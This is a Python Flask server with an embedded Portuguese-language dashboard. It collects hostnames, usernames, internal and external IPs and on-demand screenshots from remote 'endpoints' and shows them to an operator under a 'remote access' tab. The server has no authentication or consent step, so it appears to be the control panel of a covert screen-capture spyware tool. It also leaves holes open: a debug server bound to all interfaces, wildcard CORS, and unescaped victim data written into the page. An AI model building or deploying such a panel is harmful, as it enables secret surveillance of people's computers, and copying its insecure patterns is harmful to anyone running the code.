#!/usr/bin/env python3
"""
System Monitor Dashboard - Servidor com Logs de Erro
"""

import os
import json
import base64
import traceback
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# LOGS DE DEBUG ATIVADOS
DEBUG_MODE = True

def log_debug(msg, error=None):
    """Função de log detalhada"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"[{timestamp}] {msg}")
    if error:
        print(f"[{timestamp}] ERRO: {str(error)}")
        print(f"[{timestamp}] TRACEBACK: {traceback.format_exc()}")

# CORS manual
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}
screenshot_requests = {}

@app.route('/')
def index():
    log_debug("Acesso ao painel principal")
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST', 'OPTIONS'])
def register_endpoint():
    log_debug(f"REQUISIÇÃO REGISTER: {request.method}")
    
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        log_debug(f"Registrando endpoint: {endpoint_id}")
        log_debug(f"Dados recebidos: {json.dumps(data, indent=2)}")
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'timestamp': datetime.now().isoformat(),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        
        log_debug(f"✅ Endpoint registrado com sucesso: {endpoint_id}")
        return jsonify({'status': 'success', 'message': 'Endpoint registered'})
    except Exception as e:
        log_debug(f"❌ ERRO ao registrar endpoint", e)
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
def receive_screenshot():
    log_debug(f"REQUISIÇÃO SCREENSHOT: {request.method}")
    
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        image_base64 = data.get('image', '')
        
        log_debug(f"Recebendo screenshot de: {endpoint_id}")
        log_debug(f"Tamanho da imagem: {len(image_base64)} caracteres base64")
        
        if image_base64:
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'timestamp': datetime.now().isoformat()
            }
            log_debug(f"✅ Screenshot SALVO para {endpoint_id}")
            log_debug(f"Total de screenshots: {len(endpoint_screenshots)}")
        else:
            log_debug(f"⚠️ Screenshot VAZIO recebido de {endpoint_id}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        log_debug(f"❌ ERRO ao receber screenshot", e)
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST', 'OPTIONS'])
def request_screenshot(endpoint_id):
    log_debug(f"REQUISIÇÃO REQUEST_SCREENSHOT: {request.method} para {endpoint_id}")
    
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        log_debug(f"Marcando solicitação para: {endpoint_id}")
        
        screenshot_requests[endpoint_id] = {
            'requested': True,
            'timestamp': datetime.now().isoformat()
        }
        
        log_debug(f"✅ Screenshot SOLICITADO para: {endpoint_id}")
        log_debug(f"Solicitações ativas: {list(screenshot_requests.keys())}")
        
        return jsonify({
            'status': 'success', 
            'message': f'Screenshot solicitado para {endpoint_id}'
        })
    except Exception as e:
        log_debug(f"❌ ERRO ao solicitar screenshot", e)
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>', methods=['GET', 'OPTIONS'])
def check_screenshot_request(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        request_data = screenshot_requests.get(endpoint_id, {})
        has_request = request_data.get('requested', False)
        
        if DEBUG_MODE and has_request:
            log_debug(f"🔍 Verificação: {endpoint_id} tem solicitação ATIVA")
        
        return jsonify({
            'request_screenshot': has_request,
            'timestamp': request_data.get('timestamp')
        })
    except Exception as e:
        log_debug(f"❌ ERRO ao verificar solicitação", e)
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot_requests/<endpoint_id>/clear', methods=['POST', 'OPTIONS'])
def clear_screenshot_request(endpoint_id):
    log_debug(f"REQUISIÇÃO CLEAR: {request.method} para {endpoint_id}")
    
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        if endpoint_id in screenshot_requests:
            del screenshot_requests[endpoint_id]
            log_debug(f"🧹 Solicitação LIMPA para: {endpoint_id}")
        else:
            log_debug(f"⚠️ Nenhuma solicitação para limpar: {endpoint_id}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        log_debug(f"❌ ERRO ao limpar solicitação", e)
        return jsonify({'error': str(e)}), 500

@app.route('/api/endpoints', methods=['GET', 'OPTIONS'])
def get_endpoints():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        log_debug(f"Listando {len(endpoints)} endpoints")
        return jsonify(list(endpoints.values()))
    except Exception as e:
        log_debug(f"❌ ERRO ao listar endpoints", e)
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot/<endpoint_id>', methods=['GET', 'OPTIONS'])
def get_screenshot(endpoint_id):
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        log_debug(f"Buscando screenshot de: {endpoint_id}")
        
        if endpoint_id in endpoint_screenshots:
            log_debug(f"✅ Screenshot ENCONTRADO para {endpoint_id}")
            return jsonify({
                'image': endpoint_screenshots[endpoint_id]['image'],
                'timestamp': endpoint_screenshots[endpoint_id]['timestamp']
            })
        else:
            log_debug(f"❌ Screenshot NÃO ENCONTRADO para {endpoint_id}")
            log_debug(f"Screenshots disponíveis: {list(endpoint_screenshots.keys())}")
            return jsonify({'error': 'No screenshot available'}), 404
    except Exception as e:
        log_debug(f"❌ ERRO ao buscar screenshot", e)
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET', 'OPTIONS'])
def get_stats():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'success'})
    
    try:
        return jsonify({
            'total_endpoints': len(endpoints),
            'online_endpoints': sum(1 for e in endpoints.values() if e.get('status') == 'online'),
            'total_screenshots': len(endpoint_screenshots),
            'last_update': datetime.now().strftime('%H:%M:%S')
        })
    except Exception as e:
        log_debug(f"❌ ERRO ao buscar stats", e)
        return jsonify({'error': str(e)}), 500

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            color: #e0e0e0;
            overflow-x: hidden;
        }
        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 50px;
        }
        .header h1 {
            font-size: 2.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 50%, #6366f1 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -1px;
            margin-bottom: 10px;
        }
        .header p {
            color: #6b7280;
            font-size: 1rem;
            font-weight: 300;
        }
        .update-time {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
            color: #4b5563;
            font-size: 0.85rem;
        }
        .refresh-btn {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }
        .refresh-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 24px;
            margin-bottom: 40px;
        }
        .stat-card {
            background: rgba(17, 17, 27, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px;
            padding: 30px;
            text-align: center;
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            border-color: rgba(124, 58, 237, 0.4);
            transform: translateY(-4px);
            box-shadow: 0 10px 40px rgba(124, 58, 237, 0.15);
        }
        .stat-value {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            line-height: 1;
            margin-bottom: 8px;
        }
        .stat-label {
            color: #6b7280;
            font-size: 0.9rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .tabs-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }
        .tab {
            background: rgba(17, 17, 27, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            color: #9ca3af;
            padding: 14px 28px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 0.95rem;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        .tab:hover {
            background: rgba(124, 58, 237, 0.1);
            color: #e0e0e0;
        }
        .tab.active {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border-color: transparent;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4);
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
            animation: fadeIn 0.4s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .screen-section {
            background: rgba(17, 17, 27, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.15);
            border-radius: 20px;
            padding: 30px;
        }
        .screen-controls {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
        }
        .screen-select {
            width: 100%;
            max-width: 400px;
            padding: 14px 18px;
            background: rgba(10, 10, 15, 0.8);
            border: 1px solid rgba(124, 58, 237, 0.3);
            border-radius: 12px;
            color: #e0e0e0;
            font-size: 0.95rem;
            cursor: pointer;
            outline: none;
        }
        .screen-select:focus {
            border-color: #a855f7;
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.2);
        }
        .screenshot-btn {
            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
        }
        .screenshot-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
        }
        .screenshot-btn:disabled {
            background: #4b5563;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .screen-display {
            background: rgba(10, 10, 15, 0.9);
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            min-height: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .live-indicator {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 20px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .live-dot {
            width: 8px;
            height: 8px;
            background: #ef4444;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        .screen-image {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 12px;
            border: 1px solid rgba(124, 58, 237, 0.3);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }
        .empty-state {
            color: #4b5563;
            font-size: 1rem;
        }
        .section-title {
            font-size: 1.5rem;
            font-weight: 600;
            color: #f3f4f6;
            margin-bottom: 24px;
            padding-left: 12px;
            border-left: 3px solid #a855f7;
        }
        .error-log {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            color: #ef4444;
            font-family: monospace;
            font-size: 0.8rem;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
        .debug-btn {
            background: rgba(124, 58, 237, 0.2);
            color: #a855f7;
            border: 1px solid rgba(124, 58, 237, 0.3);
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.8rem;
            margin-top: 10px;
        }
        @media (max-width: 768px) {
            .stats-grid { grid-template-columns: 1fr; }
            .header h1 { font-size: 2rem; }
        }
    </style>
</head>
<body>
    <canvas id="particles-canvas"></canvas>
    <div class="container">
        <div class="header">
            <h1>System Monitor Dashboard</h1>
            <p>Com Logs de Debug</p>
            <div class="update-time">
                <button class="refresh-btn" onclick="location.reload()">Atualizar</button>
                <span id="updateTime">--:--:--</span>
            </div>
        </div>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalEndpoints">0</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineEndpoints">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalScreenshots">0</div>
                <div class="stat-label">Screenshots</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="lastUpdate">--</div>
                <div class="stat-label">Última Atualização</div>
            </div>
        </div>
        <div class="tabs-container">
            <button class="tab active" onclick="showTab('remote')">Acesso Remoto</button>
        </div>
        <div id="remote" class="tab-content active">
            <h2 class="section-title">Screenshot Manual</h2>
            <div class="screen-section">
                <div class="screen-controls">
                    <select id="endpointSelect" class="screen-select" onchange="selectEndpoint()">
                        <option value="">Selecione um endpoint...</option>
                    </select>
                    <button id="screenshotBtn" class="screenshot-btn" onclick="requestScreenshot()" disabled>
                        📸 Capturar Screenshot
                    </button>
                </div>
                <div class="screen-display" id="screenContent">
                    <div class="empty-state">Selecione um endpoint para visualizar</div>
                </div>
                <button class="debug-btn" onclick="toggleDebug()">Mostrar/Esconder Logs de Erro</button>
                <div class="error-log" id="errorLog"></div>
            </div>
        </div>
    </div>
    <script>
        const canvas = document.getElementById('particles-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        let currentEndpoint = null;
        let errorMessages = [];
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        
        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 2 + 0.5;
                this.speedX = Math.random() * 0.5 - 0.25;
                this.speedY = Math.random() * 0.5 - 0.25;
                this.opacity = Math.random() * 0.5 + 0.1;
            }
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                if (this.x > canvas.width) this.x = 0;
                if (this.x < 0) this.x = canvas.width;
                if (this.y > canvas.height) this.y = 0;
                if (this.y < 0) this.y = canvas.height;
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(168, 85, 247, ${this.opacity})`;
                ctx.fill();
            }
        }
        
        function initParticles() {
            particles = [];
            const count = Math.min(100, Math.floor((canvas.width * canvas.height) / 15000));
            for (let i = 0; i < count; i++) particles.push(new Particle());
        }
        
        function drawConnections() {
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < 100) {
                        ctx.beginPath();
                        ctx.strokeStyle = `rgba(168, 85, 247, ${0.1 * (1 - dist / 100)})`;
                        ctx.lineWidth = 0.5;
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.stroke();
                    }
                }
            }
        }
        
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            drawConnections();
            requestAnimationFrame(animateParticles);
        }
        
        initParticles();
        animateParticles();
        
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        function updateTime() {
            document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
        }
        
        function addErrorLog(msg) {
            errorMessages.push(`[${new Date().toLocaleTimeString()}] ${msg}`);
            const errorLog = document.getElementById('errorLog');
            errorLog.innerHTML = errorMessages.join('<br>');
            errorLog.scrollTop = errorLog.scrollHeight;
        }
        
        function toggleDebug() {
            const errorLog = document.getElementById('errorLog');
            errorLog.style.display = errorLog.style.display === 'block' ? 'none' : 'block';
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
                document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
                document.getElementById('totalScreenshots').textContent = data.total_screenshots || 0;
                document.getElementById('lastUpdate').textContent = data.last_update || '--';
            } catch(e) {
                addErrorLog('Erro ao carregar stats: ' + e.message);
            }
        }
        
        async function loadEndpoints() {
            try {
                const res = await fetch('/api/endpoints');
                const endpoints = await res.json();
                const select = document.getElementById('endpointSelect');
                
                let selectHtml = '<option value="">Selecione um endpoint...</option>';
                endpoints.forEach(e => {
                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
                });
                
                select.innerHTML = selectHtml;
            } catch(e) {
                addErrorLog('Erro ao carregar endpoints: ' + e.message);
            }
        }
        
        async function selectEndpoint() {
            const endpointId = document.getElementById('endpointSelect').value;
            const screenshotBtn = document.getElementById('screenshotBtn');
            
            if (!endpointId) {
                document.getElementById('screenContent').innerHTML = '<div class="empty-state">Selecione um endpoint para visualizar</div>';
                screenshotBtn.disabled = true;
                return;
            }
            
            screenshotBtn.disabled = false;
            currentEndpoint = endpointId;
            addErrorLog('Endpoint selecionado: ' + endpointId);
            
            // Verifica se já tem screenshot
            await loadScreen();
        }
        
        async function requestScreenshot() {
            const endpointId = document.getElementById('endpointSelect').value;
            if (!endpointId) return;
            
            const btn = document.getElementById('screenshotBtn');
            btn.disabled = true;
            btn.textContent = '📸 Capturando...';
            addErrorLog('Solicitando screenshot para: ' + endpointId);
            
            try {
                const res = await fetch(`/api/request_screenshot/${endpointId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                
                addErrorLog('Resposta do servidor: ' + JSON.stringify(data));
                
                if (data.status === 'success') {
                    document.getElementById('screenContent').innerHTML = `
                        <div style="color: #22c55e; margin-bottom: 20px;">✅ Screenshot solicitado! Aguarde...</div>
                        <div class="live-indicator"><span class="live-dot"></span><span>PROCESSANDO</span></div>
                    `;
                    
                    // Verifica a cada 1 segundo por 20 segundos
                    let attempts = 0;
                    const checkInterval = setInterval(async () => {
                        attempts++;
                        addErrorLog('Tentativa ' + attempts + ' de buscar screenshot...');
                        await loadScreen();
                        
                        if (attempts >= 20 || document.querySelector('.screen-image')) {
                            clearInterval(checkInterval);
                            btn.disabled = false;
                            btn.textContent = '📸 Capturar Screenshot';
                            if (!document.querySelector('.screen-image')) {
                                addErrorLog('❌ Screenshot não encontrado após 20 tentativas');
                            }
                        }
                    }, 1000);
                } else {
                    throw new Error(data.message || 'Erro ao solicitar screenshot');
                }
            } catch (error) {
                addErrorLog('❌ Erro na requisição: ' + error.message);
                document.getElementById('screenContent').innerHTML = `
                    <div style="color: #ef4444;">❌ Erro: ${error.message}</div>
                `;
                btn.disabled = false;
                btn.textContent = '📸 Capturar Screenshot';
            }
        }
        
        async function loadScreen() {
            const endpointId = document.getElementById('endpointSelect').value;
            if (!endpointId) return;
            
            try {
                addErrorLog('Buscando screenshot de: ' + endpointId);
                const res = await fetch(`/api/screenshot/${endpointId}`);
                const data = await res.json();
                
                if (data.image) {
                    addErrorLog('✅ Screenshot encontrado! Tamanho: ' + data.image.length + ' caracteres');
                    document.getElementById('screenContent').innerHTML = `
                        <div class="live-indicator"><span class="live-dot"></span><span>LIVE</span></div>
                        <img class="screen-image" src="data:image/png;base64,${data.image}" alt="Visualizacao remota">
                        <div style="margin-top: 10px; color: #6b7280; font-size: 0.8rem;">
                            Capturado em: ${new Date(data.timestamp).toLocaleString()}
                        </div>
                    `;
                } else {
                    addErrorLog('⚠️ Screenshot não encontrado ainda');
                }
            } catch(e) {
                addErrorLog('❌ Erro ao buscar screenshot: ' + e.message);
            }
        }
        
        // Inicialização
        loadStats();
        loadEndpoints();
        updateTime();
        
        // Atualiza a cada 5 segundos
        setInterval(() => {
            loadStats();
            loadEndpoints();
            updateTime();
        }, 5000);
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    log_debug(f"🚀 Servidor com LOGS iniciando na porta {port}")
    log_debug(f"🌐 URL: http://localhost:{port}")
    log_debug("📸 Modo DEBUG ativado - todos os erros serão logados")
    app.run(host='0.0.0.0', port=port, debug=True)
